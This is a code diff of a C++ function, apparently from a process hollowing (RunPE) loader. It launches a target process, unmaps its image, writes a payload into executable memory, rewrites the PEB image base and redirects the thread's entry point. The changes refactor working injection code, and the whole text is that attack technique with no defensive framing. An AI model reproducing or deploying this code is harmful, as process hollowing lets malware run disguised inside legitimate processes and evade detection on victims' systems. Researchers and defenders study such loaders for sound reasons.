@@ -37,12 +37,7 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG de
     if (!create_new_process1(targetPath, pi)) return false;
     printf("PID: %d\n", pi.dwProcessId);
 
-    const SIZE_T kPtrSize = sizeof(DWORD); //for 32 bit
-    DWORD targetImageBase = 0; //for 32 bit
-
-	ULONGLONG PEB = 0;
     //get initial context of the target:
-
 #if defined(_WIN64)
     WOW64_CONTEXT context;
     memset(&context, 0, sizeof(WOW64_CONTEXT));
@@ -55,8 +50,15 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG de
     GetThreadContext(pi.hThread, &context);
 #endif
     //get image base of the target:
-    PEB = context.Ebx;
-    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB + 8), &targetImageBase, kPtrSize, NULL)) {
+    DWORD PEB_addr = context.Ebx;
+    printf("PEB = %x\n", PEB_addr);
+
+    DWORD targetImageBase = 0; //for 32 bit
+    if (!ReadProcessMemory(pi.hProcess, LPVOID(PEB_addr + 8), &targetImageBase, sizeof(DWORD), NULL)) {
+        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
+        return false;
+    }
+    if (targetImageBase == NULL) {
         return false;
     }
     printf("targetImageBase = %x\n", targetImageBase);
@@ -66,16 +68,16 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG de
         desiredBase = payload_nt_hdr32->OptionalHeader.ImageBase;
     }
     
-    if (unmap_target || targetImageBase == desiredBase) {
+    if (unmap_target || (ULONGLONG)targetImageBase == desiredBase) {
         //unmap the target:
-        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)(static_cast<ULONGLONG>(targetImageBase))) != ERROR_SUCCESS) {
+        if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)targetImageBase) != ERROR_SUCCESS) {
             printf("Unmapping the target failed!\n");
             return false;
         }
     }
     
     //try to allocate space that will be the most suitable for the payload:
-    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID) desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID)desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remoteAddress == NULL)  {
         printf("Could not allocate memory in the remote process\n");
         return false;
@@ -119,7 +121,7 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG de
 
     //overwrite ImageBase stored in PEB
     DWORD remoteAddr32b = static_cast<DWORD>((ULONGLONG)remoteAddress);
-    if (!WriteProcessMemory(pi.hProcess, LPVOID(PEB + 8), &remoteAddr32b, sizeof(DWORD), &written) || written != kPtrSize) {
+    if (!WriteProcessMemory(pi.hProcess, LPVOID(PEB_addr + 8), &remoteAddr32b, sizeof(DWORD), &written) || written != sizeof(DWORD)) {
         printf("Failed overwriting PEB: %d\n", static_cast<int>(written));
         return false;
     }
@@ -127,7 +129,6 @@ bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG de
     //overwrite context: set new Entry Point
     DWORD newEP = static_cast<DWORD>((ULONGLONG)remoteAddress + payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
     printf("newEP: %x\n", newEP);
-
     context.Eax = newEP;
 #if defined(_WIN64)
     Wow64SetThreadContext(pi.hThread, &context);
